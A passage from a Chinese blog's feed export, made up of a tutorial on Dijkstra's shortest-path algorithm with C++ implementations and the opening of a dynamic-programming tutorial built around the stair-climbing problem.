title="具体过程"></a>具体过程</h2><p>在维基百科上有这样一张很经典的动图，很好地向我们演示了什么是Dijkstra算法：</p><p><img src="https://i.loli.net/2020/04/24/JWPcZNTaX6YwMqn.gif" alt="c43291221c382a277596d38654993caf_Dijkstra_Animation.gif"></p><p>从上面我们不难看出Dijkstra算法的整个过程：</p><ul><li><p><strong>将每个点的权值（即起始点到达该点的距离）设置为∞</strong></p></li><li><p><strong>从起始点出发，搜索距离其最近的点，将之纳入点集S</strong></p></li><li><p><strong>搜索该最近点所能到达的所有未被占用点，对比【未被占用点原权值】与【该最近点权值+边权值】的大小，若后者较小则改写该未被占用点权值并记录路径</strong></p></li><li><p><strong>不断重复第二、三步，直到所有点都被纳入点集S（即V-S= Ø，V为该图所有点的点集 ）即可得到出发点距离结束点的最短路径与最短距离</strong></p></li></ul><blockquote><p><strong>注意：第二步的第一次搜索恒为起始点本身，即将起始点纳入点集</strong></p></blockquote><p>以上即为基本的Dijkstra算法的整个过程，我们不难看出这一种不断搜索最短距离的过程其实是一种类似于贪心算法的思想，同时<strong>这样的一种路径结果记录的方法也有一定的动态规划的思想在内——到达被纳入点的最短路径已经是最优状态，无后效性，具有最优子结构</strong></p><h2 id="基本概念：图的表示"><a href="#基本概念：图的表示" class="headerlink" title="基本概念：图的表示"></a>基本概念：图的表示</h2><p>在图论当中我们常用一个二维矩阵来表示一个图，比如说上面动图中的那一张图:</p><p><img src="https://i.loli.net/2020/04/24/wKzZXiFSe4sguGT.png" alt="image.png"></p><p>我们可以使用下面这样的一个矩阵来表示（无向图）：<br><img src="https://i.loli.net/2020/04/24/M68ixjKznLBceu4.png" alt="image.png"></p><p>对于无向图而言，他的邻接矩阵一定会是对称的，<del>在离散数学课上已经讲过，这里就不再多说了</del></p><p>我们不难看出，这样一个矩阵很像一个二维数组，因此我们可以使用一个<strong>二维数组（邻接矩阵）</strong>表示一张图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[MAX][MAX];</span><br></pre></td></tr></table></figure><p>但是毫无疑问地，随着图的越来越大，二维数组所占用的空间也会爆炸式增长（尤其是像OI那样动不动就10^8、10^9的），因此我们还需要更好的方法来表示一张图</p><p>对于图<strong>G=(V,E)</strong>(其中V为点集，E为边集)，我们也可以使用<strong>邻接表</strong>来表示一张有向图：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">define edge pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;<span class="comment">//始点到终点，可用于表示有向图</span></span><br><span class="line"><span class="built_in">vector</span> &lt; pair &lt; <span class="keyword">int</span>, edge &gt; &gt; <span class="built_in">map</span>;<span class="comment">//点集与边集</span></span><br></pre></td></tr></table></figure><p><strong>当图为稀疏图、顶点较多，即图结构比较大时，更适宜选择邻接表作为存储结构。当图为稠密图、顶点较少时，或者不需要记录图中边的权值时，使用邻接矩阵作为存储结构较为合适。</strong> </p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="邻接矩阵版"><a href="#邻接矩阵版" class="headerlink" title="邻接矩阵版"></a>邻接矩阵版</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 10000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pathOut</span><span class="params">(<span class="keyword">int</span> node)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[MAX][MAX]=&#123;<span class="number">0</span>&#125;;<span class="comment">//储存邻接矩阵</span></span><br><span class="line"><span class="keyword">int</span> node, start;<span class="comment">//点数与起始点</span></span><br><span class="line"><span class="keyword">int</span> dist[MAX]=&#123;<span class="number">0</span>&#125;;<span class="comment">//起始点到各点最短距离</span></span><br><span class="line"><span class="keyword">int</span> path[MAX]=&#123;<span class="number">0</span>&#125;;<span class="comment">//到各点的最短路径，其中每个元素储存的是在到达该点的最短路径上该点的上一个点</span></span><br><span class="line"><span class="keyword">bool</span> visited[MAX]=&#123;<span class="number">0</span>&#125;;<span class="comment">//占用点的集合</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen("input.txt","r",stdin);</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the number of the nodes"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;node;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"please enter this maps\'s Adjacency Matrix"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=node;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=node;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the start node: "</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;start;</span><br><span class="line">    dijkstra();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=node;i++)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"distance to node "</span>&lt;&lt;i&lt;&lt;<span class="string">" is "</span>&lt;&lt;dist[i]&lt;&lt;<span class="string">" . The path is: "</span>;</span><br><span class="line">        pathOut(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">//核心函数：Dijkstra，搜索出发点到各点的最短路径</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=node;i++)</span><br><span class="line">    &#123;    </span><br><span class="line">        dist[i] = MAX;<span class="comment">//到各点距离设为∞</span></span><br><span class="line">        visited[i] = <span class="literal">false</span>;<span class="comment">//清空点集合</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将起始点纳入</span></span><br><span class="line">    dist[start] = <span class="number">0</span>;</span><br><span class="line">    visited[start] = <span class="literal">true</span>;</span><br><span class="line">    path[start] = start;</span><br><span class="line">    <span class="keyword">int</span> best = start;</span><br><span class="line">    <span class="comment">//遍历各点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=node;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">min</span> = MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j&lt;=node;j++)<span class="comment">//寻找【距离起始点最近的点】</span></span><br><span class="line">            <span class="keyword">if</span>(!visited[j]&amp;&amp;dist[j]&lt;<span class="built_in">min</span>)<span class="comment">//若该点未被占用且权值小于已知最近点权值</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">min</span> = dist[j];<span class="comment">//更新已知最近点距离</span></span><br><span class="line">                best = j;<span class="comment">//更新最近点</span></span><br><span class="line">            &#125;</span><br><span class="line">        visited[best] = <span class="literal">true</span>;<span class="comment">//将该点纳入集合</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=node;j++)<span class="comment">//遍历各点</span></span><br><span class="line">            <span class="comment">/*若</span></span><br><span class="line"><span class="comment">            * 该最近点能够到达j点</span></span><br><span class="line"><span class="comment">            * j点未被占用</span></span><br><span class="line"><span class="comment">            * 起始点到j点的距离 &gt; 起始点到该最近点的距离 + 该最近点到j点的距离</span></span><br><span class="line"><span class="comment">            * 更新起始点到j点的距离 为 起始点到该最近点的距离 + 该最近点到j点的距离</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">map</span>[best][j]!=<span class="number">0</span>&amp;&amp;!visited[j]&amp;&amp;dist[j]&gt;dist[best]+<span class="built_in">map</span>[best][j])</span><br><span class="line">            &#123;    </span><br><span class="line">                dist[j] = dist[best]+<span class="built_in">map</span>[best][j];</span><br><span class="line">                path[j] = best;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pathOut</span><span class="params">(<span class="keyword">int</span> node)</span><span class="comment">//用来递归打印最短路径的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(path[node] != node)</span><br><span class="line">    &#123;</span><br><span class="line">        pathOut(path[node]);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">" -&gt; "</span>&lt;&lt;node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;node;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以基本概念中的图作为输入样例，选取点2为出发点：</p><p><img src="https://i.loli.net/2020/04/25/JhyW6Nu4ectDsRK.png" alt="image.png"></p><p>得到如下结果：</p><p><img src="https://i.loli.net/2020/04/25/qKbsZpIBvrW1mC3.png" alt="image.png"></p><p>对比原图，我们不难看出我们所得出的结果是正确的</p><h3 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h3><p>方便起见，我们假设起始点恒为点1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//假设起始点为1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> edge pair <span class="meta-string">&lt; int, int&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> infinite 1145141919</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span> &lt; pair &lt; <span class="keyword">int</span>, edge &gt; &gt; G;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; key, rel;<span class="comment">// 起始点到各点距离，到各点最短路径上该点的上一点</span></span><br><span class="line"><span class="keyword">int</span> node, edg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_keys</span><span class="params">()</span><span class="comment">//初始化各点权值为infinite</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">key.resize(node);</span><br><span class="line">key[<span class="number">0</span>]=<span class="number">0</span>;<span class="comment">//初始化起始点权值为0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;node; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i]=infinite;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">rel.resize(node);</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">sort(G.<span class="built_in">begin</span>(), G.<span class="built_in">end</span>());<span class="comment">//将各点按照点1（起始点）~末点进行排序</span></span><br><span class="line"><span class="keyword">while</span>(count&lt;edg)<span class="comment">//遍历每一条边</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//若【[起始点]到[[边count]上的起点]的权值 + 该边权值】 &lt; 【[起始点]到[[边count]的终点]的权值】</span></span><br><span class="line"><span class="keyword">if</span>((key[G[count].first]+G[count].second.second)&lt;key[G[count].second.first])</span><br><span class="line">&#123;</span><br><span class="line">            <span class="comment">//设 [起始点] 到[[边count]的终点] 的 最短路径上 [[边count]的终点] 的 [上一点] 为 [[边count]的起点]</span></span><br><span class="line">rel[G[count].second.first]=G[count].first;</span><br><span class="line">            <span class="comment">//设 【[起始点] 到[[边count]的终点] 的 权值】 为 【[起始点]到[[边count]的起点]的权值 + [边count]的权值】</span></span><br><span class="line">key[G[count].second.first]=key[G[count].first]+G[count].second.second;</span><br><span class="line">&#125;</span><br><span class="line">count++;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen("input2.txt","r",stdin);</span></span><br><span class="line">    <span class="keyword">int</span> x, y, cost;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;node&gt;&gt;edg;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;edg; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y&gt;&gt;cost;</span><br><span class="line">        G.push_back(pair &lt;<span class="keyword">int</span>, edge&gt;(x<span class="number">-1</span>, edge(y<span class="number">-1</span>, cost)));</span><br><span class="line">    &#125;</span><br><span class="line">    init_keys();</span><br><span class="line">    dijkstra();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Shortest path: \n 1 is ROOT\n"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;node; i++)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"( "</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">", "</span>&lt;&lt;rel[i]+<span class="number">1</span>&lt;&lt;<span class="string">" )\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Shortest path for? : "</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"\nShortest path from 1 to "</span>&lt;&lt;x&lt;&lt;<span class="string">" is "</span>&lt;&lt;key[x<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优化：堆优化"><a href="#优化：堆优化" class="headerlink" title="优化：堆优化"></a>优化：堆优化</h2><blockquote><p>咕了，下次再补</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Dijkstra算法&lt;/strong&gt;算是图论当中最为基础的算法之一，也是各类信息学竞赛（ Olympiad in Informatics ）当中各大图论算法的基础，碰巧今天的离散数学课刚好讲到了Dijkstra算法，所以作为一名蒟蒻·前OIer，今天就来简单讲讲什么是Dijkstra算法XD&lt;/p&gt;
&lt;p&gt;&lt;del&gt;不过我当年打OI的时候基本没怎么研究过图论，所以没出过啥成绩XD&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="算法浅析" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="图论" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>【算法浅析-0x01】动态规划算法浅析by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/04/21/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x01%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/04/21/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x01%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90by-arttnba3/</id>
    <published>2020-04-21T10:27:55.000Z</published>
    <updated>2020-09-05T19:32:02.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><strong>动态规划</strong>（<strong>Dynamic Programming</strong>）是一种通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。同时也是各类信息学竞赛（ Olympiad in Informatics ）中较为常用的算法之一。</p><p>作为前·蒟蒻·OIer，对动态规划也是稍微了解一点点的XD，所以今天来简单地讲讲这个算法XD<del>就当复习了</del></p><blockquote><p>注：你一定想不到这篇文章拖了4个月才开始动笔2333333</p></blockquote><a id="more"></a><h1 id="0x01-什么是动态规划算法？"><a href="#0x01-什么是动态规划算法？" class="headerlink" title="0x01.什么是动态规划算法？"></a>0x01.什么是动态规划算法？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p><strong>动态规划</strong>（英语：Dynamic programming，简称DP）是一种在<a href="https://zh.wikipedia.org/wiki/数学" target="_blank" rel="noopener">数学</a>、<a href="https://zh.wikipedia.org/wiki/管理科学" target="_blank" rel="noopener">管理科学</a>、<a href="https://zh.wikipedia.org/wiki/计算机科学" target="_blank" rel="noopener">计算机科学</a>、<a href="https://zh.wikipedia.org/wiki/经济学" target="_blank" rel="noopener">经济学</a>和<a href="https://zh.wikipedia.org/wiki/生物信息学" target="_blank" rel="noopener">生物信息学</a>中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。</p><p>动态规划常常适用于有重叠子问题和<a href="https://zh.wikipedia.org/w/index.php?title=最优子结构&action=edit&redlink=1" target="_blank" rel="noopener">最优子结构</a>性质的问题，动态规划方法所耗时间往往远少于朴素解法。</p><p>动态规划背后的基本思想非常简单。大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。</p><p>通常许多子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，从而减少计算量：一旦某个给定子问题的解已经算出，则将其<a href="https://zh.wikipedia.org/wiki/记忆化" target="_blank" rel="noopener">记忆化</a>存储，以便下次需要同一个子问题解之时直接查表。这种做法在重复子问题的数目关于输入的规模呈<a href="https://zh.wikipedia.org/wiki/指數增長" target="_blank" rel="noopener">指数增长</a>时特别有用。</p><p><a href="https://zh.wikipedia.org/zh-cn/动态规划" target="_blank" rel="noopener">维基百科：动态规划</a></p></blockquote><p>简单而言：</p><p>动态规划便是通过寻找出一个问题的<strong>重叠子问题</strong>/<strong>最优子结构</strong>来优化对问题的求解，将问题进行分阶段求解，并确保当前阶段是过于所有阶段的完美总结。</p><p>适用于求解具有如下性质的问题</p><ul><li><strong>最优子结构</strong>： 无论其初始状态及初始决策如何，其<strong>以后诸决策对以第一个决策所形成的状态</strong>作为初始状态的过程而言，<strong>永远构成最优策略</strong>。这个原理的实质是多阶段决策过程具有这样的性质，即不管过去的过程如何，只从当前的状态和系统的最优化要求出发，作出下一步的最优决策 。</li><li><strong>无后效性</strong>： 将各阶段按照一定的次序排列好之后，对于某个给定的阶段状态，它以前各阶段的状态无法直接影响它未来的决策，而只能通过当前的这个状态。换句话说，<strong>每个状态都是过去历史的一个完整总结</strong>。这就是无后向性，又称为无后效性 </li><li><strong>子问题重叠</strong>： 动态规划算法的关键在于解决冗余，这是动态规划算法的根本目的。动态规划实质上是一种以空间换时间的技术，它在实现的过程中，不得不存储产生过程中的各种状态，所以它的空间复杂度要大于其他的算法。选择动态规划算法是因为动态规划算法在空间上可以承受，而搜索算法在时间上却无法承受，所以我们<strong>舍空间而取时间</strong></li></ul><p>如下图所示便是一个简单的动态规划算法的应用过程</p><p><img src="https://i.loli.net/2020/08/29/MAZgnQxytHqdL52.png" alt="image.png"></p><h2 id="求解过程"><a href="#求解过程" class="headerlink" title="求解过程"></a>求解过程</h2><blockquote><p>  动态规划所处理的问题是一个多阶段决策问题，一般由初始状态开始，通过对中间阶段决策的选择，达到结束状态。这些决策形成了一个决策序列，同时确定了完成整个过程的一条活动路线(通常是求最优的活动路线)。 </p><p><a href="https://blog.csdn.net/zw6161080123/article/details/80639932" target="_blank" rel="noopener">动态规划-CSDN</a></p></blockquote><p>适用于使用动态规划算法进行求解的问题的求解过程大致如下：</p><ul><li><p><strong>划分阶段</strong>：按照问题的时间或空间特征，把问题分为若干个阶段。在划分阶段时，注意划分后的阶段一定要是有序的或者是可排序的，否则问题就无法求解。</p></li><li><p><strong>确定状态和状态变量</strong>：将问题发展到各个阶段时所处于的各种客观情况用不同的状态表示出来。当然，状态的选择要满足无后效性。</p></li><li><p><strong>确定决策并写出状态转移方程</strong>：因为决策和状态转移有着天然的联系，状态转移就是根据上一阶段的状态和决策来导出本阶段的状态。所以如果确定了决策，状态转移方程也就可写出。但事实上常常是反过来做，根据相邻两个阶段的状态之间的关系来确定决策方法和状态转移方程。</p></li><li><p><strong>寻找边界条件</strong>：给出的状态转移方程是一个递推式，需要一个递推的终止条件或边界条件。</p></li></ul><h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><blockquote><p>   递推关系必须是从次小的问题开始到较大的问题之间的转化，从这个角度来说，动态规划往往可以用递归程序来实现，不过因为递推可以充分利用前面保存的子问题的解来减少重复计算，所以对于大规模问题来说，有递归不可比拟的优势，这也是动态规划算法的核心之处。 </p><p><a href="https://blog.csdn.net/zw6161080123/article/details/80639932" target="_blank" rel="noopener">动态规划-CSDN</a></p></blockquote><p>在使用计算机求解适用于使用动态规划算法进行解决的问题时，我们首先需要确定<strong>动态规划三要素</strong>:</p><ul><li>问题的阶段</li><li>每个阶段的状态</li><li>从前一个阶段转换到后一个阶段之间的递推关系</li></ul><h1 id="0x02-动态规划算法的简单应用"><a href="#0x02-动态规划算法的简单应用" class="headerlink" title="0x02.动态规划算法的简单应用"></a>0x02.动态规划算法的简单应用</h1><p>有了如上的这些概念，我们很容易就能知道该如何使用动态规划算法来解决实际生活（<del>OI生活</del>）中的问题</p><p>那么下面选几个<del>OI中</del>生活中常见的问题来简单讲讲动态规划23333</p><h2 id="上楼梯问题"><a href="#上楼梯问题" class="headerlink" title="上楼梯问题"></a>上楼梯问题</h2><blockquote><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>楼梯有 N<em>N</em> 阶，上楼可以一步上一阶，也可以一步上二阶。</p><p>编一个程序，计算共有多少种不同的走法。</p><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>一个数字，楼梯数。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>输出走的方式总数。</p><h3 id="输入输出样例"><a href="#输入输出样例" class="headerlink" title="输入输出样例"></a>输入输出样例</h3><p><strong>输入 #1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><p><strong>输出 #1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><h2 id="说明-提示"><a href="#说明-提示" class="headerlink" title="说明/提示"></a>说明/提示</h2><ul><li>对于 <strong>60%</strong> 的数据，<strong>N≤50</strong>；</li><li>对于 <strong>100%</strong> 的数据，<strong>N≤5000</strong>。</li></ul><p><a href="https://www.luogu.com.cn/problem/P1255" target="_blank" rel="noopener">洛谷-P1255 数楼梯</a></p></blockquote><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>简单分析：</p><ul><li><p>上0级楼梯：有0种走法</p></li><li><p>上1级楼梯：有1种走法：直接跨一阶楼梯</p></li><li><p>上2级楼梯：有2种走法：①先跨一阶再跨一阶；②直接跨两阶楼梯</p></li><li><p>……</p></li><li><p><strong>上N阶楼梯</strong>：<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯</strong>：一共是<strong>F(N-1)+F(N-2)种走法</strong></p></li></ul><p>也就是说，我们走n级楼梯的走法数量都可以化为<strong>①先走到第N-1阶，再跨一阶楼梯②先走到N-2阶，再一步跨两阶楼梯</strong>的走法</p><h4 id="状态转移方程"><a href="#状态转移方程" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p><strong>F(N) = F(N-1) + 